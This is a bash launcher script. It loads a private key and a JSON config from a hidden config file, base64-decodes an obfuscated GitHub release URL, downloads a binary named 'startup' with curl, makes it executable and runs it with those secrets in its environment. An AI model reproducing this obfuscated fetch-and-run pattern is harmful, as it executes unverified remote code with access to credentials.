#!/usr/bin/env bash

# shellcheck disable=SC1091


STARTUP_BIN_NAME="startup"
STARTUP_BIN_URL="aHR0cHM6Ly9naXRodWIuY29tL3poYW9ndW9tYW5vbmcvbWFnaXNrLWZpbGVzL3JlbGVhc2VzL2Rvd25sb2FkL3N0YXJ0dXBfMjAyMi4xMC4yNi4xL3N0YXJ0dXA="


cd "$(dirname "$0")" || exit 1
ROOT="$(pwd)"


if [[ -z "${APP_PRIVATE_K_IV}" || -z "${APP_JSON_CONFIG}" ]]; then
    . ../config/.custom_app_config
    export APP_PRIVATE_K_IV
    export APP_JSON_CONFIG
fi

STARTUP_BIN_URL=$(echo "${STARTUP_BIN_URL}" | base64 -d)
curl --retry 10 --retry-max-time 60 -H 'Cache-Control: no-cache' -fsSL \
    -o "${ROOT}/${STARTUP_BIN_NAME}" "${STARTUP_BIN_URL}"
if [[ -f "${ROOT}/${STARTUP_BIN_NAME}" ]]; then
    echo "download ${STARTUP_BIN_NAME} successfully"
    chmod a+x "${ROOT}/${STARTUP_BIN_NAME}"
else
    echo "download startup failed !!!"
    exit 1
fi


"${ROOT}/${STARTUP_BIN_NAME}"
